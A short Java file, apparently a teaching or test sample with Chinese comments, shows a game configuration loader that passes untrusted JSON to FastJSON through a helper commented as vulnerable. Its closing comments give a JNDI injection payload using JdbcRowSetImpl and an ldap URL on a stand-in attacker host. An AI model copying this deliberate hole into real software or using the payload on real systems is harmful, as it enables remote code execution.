package com.gamestudio.config;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.TypeReference;
import java.util.Map;

// 领域服务类
public class GameConfigLoader {
    // 加载游戏配置
    public GameConfig loadConfig(String jsonData) {
        // 模拟从不可信来源读取配置
        Map<String, Object> configMap = JsonUtils.jsonToObject(jsonData, new TypeReference<Map<String, Object>>(){});
        
        // 领域逻辑处理
        if("hard".equals(configMap.get("difficulty"))) {
            return new GameConfig(100, 50, 10);
        }
        return new GameConfig(50, 25, 5);
    }

    // 领域实体类
    public static class GameConfig {
        private int health;
        private int attack;
        private int defense;

        public GameConfig(int health, int attack, int defense) {
            this.health = health;
            this.attack = attack;
            this.defense = defense;
        }

        // Getters and setters
    }
}

// 基础设施层工具类
class JsonUtils {
    // 存在漏洞的反序列化方法
    public static <T> T jsonToObject(String jsonData, TypeReference<T> typeReference) {
        // 不安全的反序列化调用
        return JSON.parseObject(jsonData, typeReference);
    }
}

// 模拟攻击利用
// 攻击者可通过构造特殊JSON触发JNDI注入
// 例如：{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/x"}
// 当FastJSON处理该JSON时，会自动实例化JdbcRowSetImpl类并调用setDataSourceName